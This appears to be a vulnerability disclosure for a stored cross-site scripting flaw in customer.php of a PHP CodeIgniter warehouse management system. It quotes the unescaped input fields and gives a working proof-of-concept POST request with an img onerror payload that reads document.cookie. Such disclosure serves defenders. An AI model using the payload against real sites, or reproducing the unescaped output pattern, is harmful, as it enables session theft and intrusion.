Warehouse Management System Store XSS on (customer.php) 

```
/www/ci_wms/application/views/admin/content/website/customer.php
```

Vendor Homepage:

```
https://www.sourcecodester.com/php-codeigniter-warehouse-management-system-free-source-code
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
/www/ci_wms/application/views/admin/content/website/customer.php
```

The potential risk of Cross-Site Scripting (XSS) arises because the values of the `$nama_customer` and `$alamat_customer` and`$notelp_customer`variables are directly inserted into the `value` attribute of HTML input fields without undergoing HTML entity encoding. This means that if these variables contain malicious JavaScript code,  this code will be executed by the browser when the page loads.

```
                            <div class="form-group form-material">
                                <label class="control-label" for="inputText">Customer Name</label>
                                <input type="text" value="<?php echo $nama_customer; ?>" class="form-control input-sm" id="nama_customer" name="nama_customer" placeholder="Customer Name"
                                    required/>
                            </div>
                            <div class="form-group form-material">
                                <label class="control-label" for="inputText">Address</label>
                                <input type="text" value="<?php echo $alamat_customer; ?>" class="form-control input-sm" id="alamat_customer" name="alamat_customer"
                                    placeholder="Address" required/>
                            </div>
                            <div class="form-group form-material">
                                <label class="control-label" for="inputText">Telephone Number</label>
                                <input type="text" value="<?php echo $notelp_customer; ?>" class="form-control input-sm" id="notelp_customer" name="notelp_customer"
                                    placeholder="Telephone Number" required/>
                            </div>
```

Proof of vulnerability:

Request:

```
POST /ci_wms/website/customer/edit/5 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 173
Origin: http://localhost
Sec-GPC: 1
Connection: close
Referer: http://localhost/ci_wms/website/customer/edit/5
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14; sessions=i0qtlgb7oh0b2a6dgunv4tff2c11ilsd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

id_customer=5&nama_customer=Betty+Wright%3Cimg+src%3Dx+onerRor%3Dalert%28document.cookie%29%3E&alamat_customer=1205+Cardinal+Lane&notelp_customer=01478000&simpan=Update+Data
```

payload

```
<img src=x onerRor=alert(document.cookie)>
```
<img width="1319" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/59730c76-4460-43f7-83e6-7ec5520f9570">
<img width="766" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/f024a832-41fc-4e11-807d-0c5d0d59b625">
<img width="1311" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/bbf1e273-0e64-40c0-b908-04f0ac050729">





